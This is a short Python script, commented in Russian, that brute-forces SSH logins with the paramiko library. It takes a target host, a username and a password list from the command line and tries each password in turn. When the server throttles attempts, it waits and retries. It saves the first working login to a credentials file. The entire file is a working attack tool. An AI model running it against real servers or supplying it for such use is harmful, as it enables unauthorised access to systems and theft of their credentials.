import paramiko  #предоставляет функциональность клиента и сервера; Реализация протокола SSHv2
import socket
import time
from colorama import init, Fore
import argparse

init()

GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET
BLUE = Fore.BLUE

def is_ssh_open(hostname, username, password):
    # Инициализируем SSH-клиент; SSHClient() - > класс, выполняющий аутентификацию клиента
    client = paramiko.SSHClient()
    # Указываем какую политику нужно использовать при подключении к серверу с неизвестным ключом
    # AutoAddPolicy() - > добавляет ноое имя хоста и ключ в объект HostKeys
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # подключаемся к SSH-серверу
        client.connect(hostname=hostname, username=username, password=password, timeout=3)
    except socket.timeout:
        #если хост недоступен в течение 3х сек.
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:  # Если не верна пара логин пароль
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:   # Большое кол-во попыток аутентифик. за малый промежуток вр.
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        time.sleep(60)
        return is_ssh_open(hostname, username, password) # рекурсивно вызываем функцию после сна
    else:
        # Соединение успешно установлено
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSH Bruteforce Python")
    parser.add_argument("host", help="Host name or IP Address of SSH Server to bruteforce")
    parser.add_argument("-P", "--passlist", help="File that contain password list in each line.")
    parser.add_argument("-u", "--user", help="Host username")

    #парсим введенные аргументы
    args = parser.parse_args()
    host = args.host
    passlist = args.passlist
    user = args.user

    # читаем файл
    passlist = open(passlist).read().splitlines()
    #brute-force

    for password in passlist:
        if is_ssh_open(host, user, password):
            # если комбинация действительна, то записываем в файл
            open("credentials.txt", "w").write(f"{user}@{host}:{password}")
            break